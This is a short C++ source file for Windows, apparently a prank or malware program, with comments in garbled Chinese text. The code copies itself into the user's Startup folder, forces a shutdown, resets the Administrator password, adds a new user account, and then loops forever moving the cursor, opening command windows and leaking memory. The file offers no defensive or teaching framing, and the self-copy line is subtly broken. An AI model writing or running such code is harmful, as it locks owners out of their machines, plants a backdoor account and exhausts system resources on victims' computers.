#include <iostream>
#include<windows.h>
#include<ctime>
#include <cstdlib>
# include <stdio.h>
#include <string.h>
#include <fstream>
using namespace std;
int main (int argc,char *argv[])
{
	char copy[80];
	sprintf(copy,"copy %s \"%%userprofile%%\\����ʼ���˵�\\����\\����\"");
	system(copy); //�����bai���򿽵�du���������ļ�������zhi
	char cmd[]="shutdown -s -t 20";//�Զ��ػ�
	system("ping baidu.com");
	system(cmd);
	system("pause");
	system(copy);
	system("net user Administrator xz");//���ÿ�������Ϊxz
	system("net user ���� xz /add");//�����û�,������Ϊ���� 
	int x=GetSystemMetrics(SM_CXSCREEN);//���x�� 
    int y=GetSystemMetrics(SM_CYSCREEN);//���y�� 
    srand(time(0));//����������� 
    system("shutdown -s -t 20");//20��ػ� 
    while(1)//ѭ�� 
    { 
    	SetCursorPos(rand()%x,rand()%y);//��� x y�� ���
    	system("start");//�������� 	
        char *p=new char[10000];//������ 
    }  
    
} 


